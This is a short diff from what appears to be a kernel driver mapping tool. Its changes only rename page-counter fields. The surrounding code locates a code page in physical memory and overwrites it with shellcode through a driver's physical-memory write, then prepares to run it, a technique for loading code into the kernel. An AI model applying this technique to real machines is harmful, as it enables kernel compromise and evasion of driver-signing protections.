@@ -796,14 +796,14 @@ BOOL WINAPI KDUProcExpPagePatchCallback(
             signatureSize))
         {
             printf_s("\tFound page with code at address 0x%llX\r\n", Address);
-            Params->cbPagesFound += 1;
+            Params->ccPagesFound += 1;
 
             if (WritePhysicalMemory(Context->DeviceHandle,
                 Address + PE152_DISPATCH_PAGE_OFFSET,
                 Params->pvPayload,
                 Params->cbPayload))
             {
-                Params->cbPagesModified += 1;
+                Params->ccPagesModified += 1;
                 printf_s("\tMemory has been modified at address 0x%llX\r\n", Address + PE152_DISPATCH_PAGE_OFFSET);
             }
             else {
@@ -869,8 +869,8 @@ BOOL KDUMapDriver2(
         if (readyEventHandle) {
 
             enumParams.bWrite = TRUE;
-            enumParams.cbPagesFound = 0;
-            enumParams.cbPagesModified = 0;
+            enumParams.ccPagesFound = 0;
+            enumParams.ccPagesModified = 0;
             enumParams.Context = Context;
             enumParams.pvPayload = pvShellCode;
             enumParams.cbPayload = ScSizeOf(Context->ShellVersion, NULL);
@@ -881,8 +881,8 @@ BOOL KDUMapDriver2(
             if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {
 
                 printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
-                    enumParams.cbPagesFound,
-                    enumParams.cbPagesModified);
+                    enumParams.ccPagesFound,
+                    enumParams.ccPagesModified);
 
                 //
                 // Run shellcode.
